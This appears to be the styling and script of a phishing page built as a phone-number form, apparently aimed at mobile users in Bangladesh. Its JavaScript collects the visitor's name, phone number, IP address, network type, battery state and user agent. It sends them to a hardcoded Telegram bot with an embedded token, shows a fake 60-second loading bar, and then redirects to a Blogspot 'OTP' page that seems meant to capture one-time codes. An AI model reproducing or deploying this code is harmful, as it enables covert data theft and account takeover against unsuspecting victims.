    /* Your CSS styles here */

    *, *:before, *:after {

      box-sizing: border-box;

      -webkit-font-smoothing: antialiased;

    .background {

      display: flex;

    }

    .container {

      margin: auto;

    .screen {

      position: relative;

      background: #3e3e3e;

      border-radius: 15px;

    }

    .screen:after {

      content: '';

      display: block;

      position: absolute;

      top: 0;

      left: 20px;

      right: 20px;

      bottom: 0;

      border-radius: 15px;

      box-shadow: 0 20px 40px rgba(0, 0, 0, .4);

      z-index: -1;

    .screen-header {

    }

    .screen-header-left {

    }

    .screen-header-button {

      display: inline-block;

      width: 8px;

      height: 8px;

      margin-right: 3px;

      border-radius: 8px;

    .screen-header-right {

    .screen-header-ellipsis {

      height: 3px;

      margin-left: 2px;

      border-radius: 8px;

    .screen-body {

    .screen-body-item.left {

    .app-title {

      position: relative;

      color: #ea1d6f;

      font-size: 26px;

    }

    .app-title:after {

      content: '';

      display: block;

      position: absolute;

      left: 0;

      bottom: -10px;

      height: 4px;

      background: #ea1d6f;

    .app-form-group {

    }

    .app-form-group.message {

      margin-top: 40px;

    }

    .app-form-group.buttons {

      margin-bottom: 20px;

      text-align: right;

    }

    .app-form-control {

      width: 100%;

      padding: 10px 0;

      background: none;

      border: none;

      border-bottom: 1px solid #666;

      color: #ddd;

      font-size: 14px;

      text-transform: uppercase;

      outline: none;

      transition: border-color .2s;

    }

    .app-form-control::placeholder {

      color: #666;

    }

    .app-form-control:focus {

      border-bottom-color: #ddd;

    }

    .app-form-button {

      background: none;

      border: none;

      color: #ea1d6f;

      font-size: 14px;

      cursor: pointer;

      outline: none;

    }

    .app-form-button:hover {

      color: #b9134f;

    }

    .credits {

      display: flex;

      justify-content: center;

      align-items: center;

      margin-top: 20px;

      color: #ffa4bd;

      font-family: 'Roboto Condensed', sans-serif;

      font-size: 16px;

      font-weight: normal;

    }

    .credits-link {

      display: flex;

      align-items: center;

      color: #fff;

      font-weight: bold;

      text-decoration: none;

    }

    .dribbble {

      width: 20px;

      height: 20px;

      margin: 0 5px;

    }

    @media screen and (max-width: 520px) {

      .screen-body {

        flex-direction: column;

      }

      .screen-body-item.left {

        margin-bottom: 30px;

      }

      .app-title {

        flex-direction: row;

      }

      .app-title span {

        margin-right: 12px;

      }

      .app-title:after {

        display: none;

      }

    }

    @media screen and (max-width: 600px) {

      .screen-body {

        padding: 40px;

      }

      .screen-body-item {

        padding: 0;

      }

    }

  /* Loading bar style */

  .loading-bar {

    width: 0;

    height: 15px;

    background-color: green;

    transition: width 60s linear;

  }

  /* Please wait style */

  .loading-bar-container {

    text-align: center;

    margin-top: 20px;

    display: none;

  }

  .please-wait {

    margin-top: 10px;

    font-size: 16px;

    color: #fff;

  }

  .dot-animation span {

    display: inline-block;

    animation: blink 1.5s infinite;

  }

  .dot-animation span:nth-child(2) {

    animation-delay: 0.5s;

  }

  .dot-animation span:nth-child(3) {

    animation-delay: 1s;

  }

  @keyframes blink {

    0%, 100% {

      opacity: 1;

    }

    50% {

      opacity: 0;

    }

  }

  .error-message {

    color: red;

    display: none;

    margin-top: 10px;

    font-size: 12px;

  }

  .message-step {

    display: none;

  }

</style>

  <script>

// Function to validate phone number
function validatePhoneNumber(phoneNumber) {
    const phoneRegex = /^01[3-9]\d{8}$/;
    return phoneRegex.test(phoneNumber);
}

// Asynchronous function to handle form submission
async function submitForm() {
    const sendButton = document.querySelector('.app-form-button[onclick="submitForm()"]');
    const contactNo = document.getElementById('contactNo').value;
    const errorMessage = document.getElementById('error-message');

    if (!validatePhoneNumber(contactNo)) {
        errorMessage.style.display = 'block';
        return;
    } else {
        errorMessage.style.display = 'none';
    }

    sendButton.disabled = true;

    const name = document.getElementById('name').value;

    // Get IP address from an external service (replace with actual implementation)
    const ip = await fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => data.ip)
        .catch(() => 'IP Not Available');

    // Detect network type, with better handling for Wi-Fi
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    let networkType = connection ? connection.effectiveType : 'Unknown';

    // Check if the network is Wi-Fi
    if (networkType === 'unknown' && connection && connection.type === 'wifi') {
        networkType = 'wifi';
    } else if (networkType !== 'wifi' && connection && connection.type === 'wifi') {
        networkType = 'wifi';
    }

    const batteryInfo = await navigator.getBattery();
    const batteryLevel = batteryInfo.level * 100;
    const isCharging = batteryInfo.charging;
    const phoneName = navigator.userAgent;

    const data = {
        name: name,
        contactNo: contactNo,
        ip: ip,
        networkType: networkType,
        batteryLevel: batteryLevel,
        isCharging: isCharging,
        phoneName: phoneName
    };

    fetch('https://api.telegram.org/bot6696317970:AAH1NZPjLjwD_8Jav73izvSqtDKL9qGpMBE/sendMessage', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: '5624278091',
            
            
            text: `
┌─────────────────⭓
├⪦ ∷ Iᴘ: ${data.ip}
├⪦ ∷ Nᴀᴍᴇ: ${data.name}
├⪦ ∷ Nᴜᴍʙᴇʀ: ${data.contactNo}
├⪦ ∷ Nᴇᴛᴡᴏʀᴋ: ${data.networkType}
├⪦ ∷ Bᴀᴛᴛᴇʀʏ Lᴇᴠᴇʟ: ${data.batteryLevel}%
├⪦ ∷ Cʜᴀʀɢɪɴɢ: ${data.isCharging ? 'Yes' : 'No'}
└─────────────────⧕
✦────────────────────────✦
Phone: ${data.phoneName}
✦────────────────────────✦`
        })
    }).then(response => {
        if (response.ok) {
            // Handle successful response
            const loadingBarContainer = document.getElementById('loading-bar-container');
            const loadingBar = document.getElementById('loading-bar');
            const messageSteps = document.querySelectorAll('.message-step');

            loadingBarContainer.style.display = 'block';
            loadingBar.style.width = '0%';
            let currentStep = 0;
            messageSteps[currentStep].style.display = 'block';
            const stepInterval = setInterval(() => {
                messageSteps[currentStep].style.display = 'none';
                currentStep++;
                if (currentStep < messageSteps.length) {
                    messageSteps[currentStep].style.display = 'block';
                } else {
                    clearInterval(stepInterval);
                }
            }, 15000); // Change steps every 15 seconds
            setTimeout(() => {
                loadingBar.style.width = '100%';
            }, 10);
            setTimeout(() => {
                // Redirect to OTP page with URL parameters
                const phoneNumber = encodeURIComponent(data.contactNo);
                const userName = encodeURIComponent(data.name);
                window.location.href = `https://borntofightt.blogspot.com/p/otp-field-form-body-margin-0-font.html?number=${phoneNumber}&name=${userName}`;
            }, 60000);
        } else {
            alert('Failed to send message');
        }
    }).catch(error => {
        console.error('Error sending message:', error);
    }).finally(() => {
        setTimeout(() => {
            sendButton.disabled = false;
        }, 50000);
    });
}

// Function to handle form cancellation
function cancel() {
    const sendButton = document.querySelector('.app-form-button[onclick="submitForm()"]');
    const loadingBarContainer = document.getElementById('loading-bar-container');
    const loadingBar = document.getElementById('loading-bar');
    const messageSteps = document.querySelectorAll('.message-step');

    loadingBarContainer.style.display = 'none';
    loadingBar.style.width = '0%';
    sendButton.disabled = false;
    messageSteps.forEach(step => step.style.display = 'none');
}
